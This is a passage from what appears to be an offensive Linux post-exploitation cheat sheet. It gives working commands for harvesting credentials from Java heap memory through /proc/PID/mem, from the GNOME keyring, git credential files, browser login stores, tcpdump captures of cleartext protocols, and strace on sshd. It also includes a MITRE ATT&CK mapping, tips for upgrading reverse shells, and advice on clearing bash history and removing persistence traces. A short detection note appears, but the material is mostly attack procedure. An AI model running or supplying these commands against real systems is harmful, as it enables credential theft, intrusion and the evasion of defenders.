cat /proc/$(pgrep -n java)/maps 2>/dev/null | grep heap

# === Step 3: Extract heap region via dd ===
# Get heap start and end addresses from maps:
HEAP=$(cat /proc/$(pgrep -n java)/maps | grep heap | head -1 | awk '{print $1}')
START=$((16#$(echo $HEAP | cut -d'-' -f1)))
END=$((16#$(echo $HEAP | cut -d'-' -f2)))
SIZE=$((END - START))

# === Step 4: Dump the heap ===
sudo dd if=/proc/$(pgrep -n java)/mem bs=1 skip=$START count=$SIZE of=/tmp/heap.bin 2>/dev/null

# === Step 5: Find strings (passwords, tokens, connection strings) ===
strings /tmp/heap.bin | grep -iE 'pass(word)?|secret|token|key|jdbc:|mongodb:|redis:'
strings /tmp/heap.bin | grep -E '[A-Za-z0-9+/]{40,}={0,2}'   # base64 tokens/keys
```

### Keyring and Credential Stores

```bash
# === GNOME keyring (interactive desktop sessions) ===
python3 -c "
import secretstorage
bus = secretstorage.dbus_init()
coll = secretstorage.get_default_collection(bus)
for item in coll.get_all_items():
    print(item.get_label(), item.get_secret())
" 2>/dev/null

# === git credential store ===
cat ~/.git-credentials 2>/dev/null
git config --global credential.helper      # check if plaintext storage enabled

# === Mozilla Firefox / Chromium saved passwords (requires logins.json + key4.db) ===
find ~/.mozilla -name 'logins.json' 2>/dev/null    # locate
find ~/.config/chromium -name 'Login Data' 2>/dev/null  # SQLite db
```

### Network Service Credential Interception

```bash
# === tcpdump (if cap_net_raw or running as root) — capture cleartext protocols ===
tcpdump -i eth0 -A -s0 'port 21 or port 23 or port 80 or port 110 or port 143' 2>/dev/null
# Look for USER/PASS in FTP, cleartext HTTP Basic Auth (Authorization: Basic)

# === Capture and decode HTTP Basic Auth ===
tcpdump -i eth0 -A -l 2>/dev/null | grep -i 'authorization: basic' \
  | awk '{print $3}' | base64 -d

# === strace a running process to intercept read/write syscalls (root) ===
strace -p $(pgrep sshd | head -1) -e trace=read,write -s 4096 2>&1 \
  | grep -iE 'password|secret'
```

**Detection notes:** Reading `/proc/PID/mem` generates `ptrace` syscall events — heavily monitored. `strace -p` on privileged processes requires root and generates auditd events. Mass file reads of `.env` and `.bash_history` across multiple directories are behavioral indicators. Falco rule: `fd.name startswith /proc and evt.type=read and user.uid!=0`.

---

## Quick Reference — MITRE ATT&CK Mapping

| Technique | ATT&CK ID | Key Binaries |
|-----------|-----------|--------------|
| Shell escape (restricted shell) | T1059.004 | bash, python3, awk, vim, perl, find |
| SUID binary abuse | T1548.001 | find, bash, cp, python3, env |
| Sudo misconfiguration | T1548.003 | vim, python3, perl, tar, docker, curl |
| Capabilities abuse | T1068 | python3, perl, ruby, vim, tcpdump |
| File read (privileged) | T1005 | dd, tee, openssl, base64, python3 |
| File write (privileged) | T1222 | dd, tee, cp, install, curl, wget |
| Network exfil | T1041 | curl, wget, nc, openssl, python3 |
| DNS exfil | T1048.003 | nslookup, dig |
| Encrypted C2 | T1573.002 | openssl s_client |
| Cron persistence | T1053.003 | crontab, /etc/cron.d/ |
| Profile persistence | T1546.004 | .bashrc, .bash_profile, /etc/profile |
| SSH key persistence | T1098.004 | authorized_keys |
| Credential from files | T1552.001 | cat, find, grep, python3 |
| Credential from memory | T1003.007 | dd (/proc/mem), strings, strace |
| Password hash access | T1003.008 | /etc/shadow, unshadow |

---

## Operational Notes

- **Binary availability:** Always run `which` or check `compgen -c` before assuming a binary is present. Alpine/minimal containers may not have `perl`, `ruby`, or even `python3`.
- **SUID drops on bash ≥ 4.4:** Modern `bash` drops effective UID to real UID at startup unless `-p` is passed. Always use `-p`.
- **PTY vs non-PTY:** Many LOTL reverse shells lack a PTY. Upgrade with `python3 -c 'import pty; pty.spawn("/bin/bash")'` immediately after getting a shell.
- **Filesystem noise:** Even LOL binaries leave traces — `/var/log/auth.log`, auditd, and process accounting (`acct`) all record executions. Minimize disk writes and use `/dev/shm` or pipes where possible.
- **Cleaning up:** `history -c && history -w` clears bash history in the current session. For cron jobs used as one-shot persistence triggers, remove them immediately after they fire.
